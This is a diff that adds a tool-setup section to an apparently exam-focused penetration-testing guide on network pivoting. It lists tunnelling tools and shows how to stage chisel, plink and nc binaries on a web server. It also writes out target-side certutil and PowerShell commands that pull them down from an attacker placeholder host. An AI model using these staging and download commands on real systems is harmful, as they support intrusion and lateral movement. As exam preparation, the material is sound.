@@ -14,6 +14,43 @@ placeholders `<PIVOT_IP>` / `<DEEP_IP>` name the hops of the pivot chain (see th
 
 ---
 
+## 0 · Toolbox — set this up *before* the exam
+
+**Install on Kali** (so the binaries/servers are ready when you need them):
+
+```bash
+sudo apt update
+sudo apt install -y chisel proxychains4 sshuttle socat openssh-server dnscat2   # core pivoting kit
+# proxychains4 config lives at /etc/proxychains4.conf — edit the last [ProxyList] line per tunnel
+# openssh-server gives you `sudo systemctl start ssh` for any -R / reverse tunnel back to Kali
+```
+
+> If a package is missing on your build: `chisel` → grab the release binary from
+> github.com/jpillora/chisel; `dnscat2` → github.com/iagox86/dnscat2 (server is Ruby: `gem install`).
+> Confirm each is on PATH: `which chisel proxychains4 sshuttle socat`.
+
+**Stage for Windows targets** — copy these to a folder you serve over HTTP (`/var/www/html/`, then
+`sudo systemctl start apache2`) so a foothold can `wget`/`certutil` them down:
+
+| File | Where it ships on Kali | Why you copy it to the target |
+|---|---|---|
+| `chisel.exe` (Windows build) | download from the chisel releases page | reverse-SOCKS pivot from a Windows box through DPI |
+| `plink.exe` | `/usr/share/windows-resources/binaries/plink.exe` | SSH `-R` from legacy Windows with no OpenSSH |
+| `nc.exe` | `/usr/share/windows-resources/binaries/nc.exe` | quick relays / shells alongside the tunnel |
+| (`ssh.exe` / `netsh`) | **already on modern Windows** — nothing to copy | native forward + portproxy, see tunnelling.md §C.1/§C.3 |
+
+```bash
+# typical staging + target-side pull
+sudo cp $(which chisel) /var/www/html/                       # linux chisel for a *nix pivot
+sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+sudo systemctl start apache2
+#  on the target:
+#   powershell wget -Uri http://<KALI>/plink.exe -OutFile C:\Windows\Temp\plink.exe
+#   certutil -urlcache -f http://<KALI>/chisel.exe C:\Windows\Temp\chisel.exe   (fallback)
+```
+
+---
+
 ## 1 · Enumerate the pivot before you tunnel
 
 The moment you get a shell on a dual-homed host, map what it can see — that defines every tunnel.
